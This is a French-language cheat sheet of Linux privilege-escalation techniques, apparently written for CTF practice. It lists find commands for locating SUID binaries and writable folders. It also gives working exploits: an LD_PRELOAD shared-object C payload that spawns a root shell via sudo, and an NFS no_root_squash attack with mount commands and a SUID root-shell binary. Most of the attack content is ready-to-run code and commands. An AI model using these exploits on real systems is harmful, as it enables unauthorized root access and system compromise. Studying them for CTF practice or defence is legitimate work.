# Linux

Des techniques pour de la PrivEsc sur linux !

## Commande find

```
- find . -name flag1.txt: find the file named “flag1.txt” in the current directory
- find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
- find / -type d -name config: find the directory named config under “/”
- find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
- find / -perm a=x: find executable files
- find /home -user frank: find all files for user “frank” under “/home”
- find / -mtime 10: find files that were modified in the last 10 days
- find / -atime 10: find files that were accessed in the last 10 day
- find / -cmin -60: find files changed within the last hour (60 minutes)
- find / -amin -60: find files accesses within the last hour (60 minutes)
- find / -size 50M: find files with a 50 MB size

- find / -type f -perm -04000 -ls 2>/dev/null
- find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

- find / -writable -type d 2>/dev/null  : Find world-writeable folders
- find / -perm -222 -type d 2>/dev/null : Find world-writeable folders
- find / -perm -o w -type d 2>/dev/null : Find world-writeable folders
- find / -perm -o x -type d 2>/dev/null : Find world-executable folders

Find development tools and supported languages:

- find / -name perl*
- find / -name python*
- find / -name gcc*
```
## LD_PRELOAD

```
The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

## NFS

```
cat /etc/exports
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/abe3fe15-addc-4f91-8150-3dd064e5e346)

tout ce qui contient "no_root_squash" est suscpetible de permettre un PrivEsc.
<br>
Pour checker les repertoires à distance
[Attaquant]
```
showmount -e <ip_distante>
```
```
mount -o rw <ip_distante>:/backups /tmp/backup
```
Script 'privEsc.c'

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

```
gcc privEsc.c -o privEsc -w
chmod +s privEsc
```

[Victime]
```
./privEsc
```
